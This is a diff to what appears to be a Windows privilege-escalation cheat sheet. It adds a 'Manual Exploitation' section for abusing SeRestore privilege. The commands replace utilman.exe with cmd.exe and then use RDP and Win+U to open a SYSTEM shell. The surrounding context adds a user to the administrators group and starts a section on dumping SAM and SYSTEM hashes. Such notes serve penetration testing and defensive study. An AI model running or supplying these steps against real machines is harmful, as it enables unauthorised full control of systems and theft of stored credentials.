@@ -20,6 +20,20 @@ OR add our user to local administrators group, then connect with psexec
 
     SeRestoreAbuse.exe "cmd /c net localgroup administrators user /add"
 
+Manual Exploitation
+
+#### 1: Rename utilman.exe to utilman.old
+
+    ren C:\Windows\System32\utilman.exe utilman.old
+
+#### 2: Rename cmd.exe to utilman.exe
+
+    ren C:\Windows\System32\cmd.exe utilman.exe
+
+#### 3: Connect via RDP, then press Win+U keys to run cmd.exe as SYSTEM
+
+    rdesktop IP
+
 ### SeBackup
 
 #### 1: Backup SAM and SYSTEM hashes
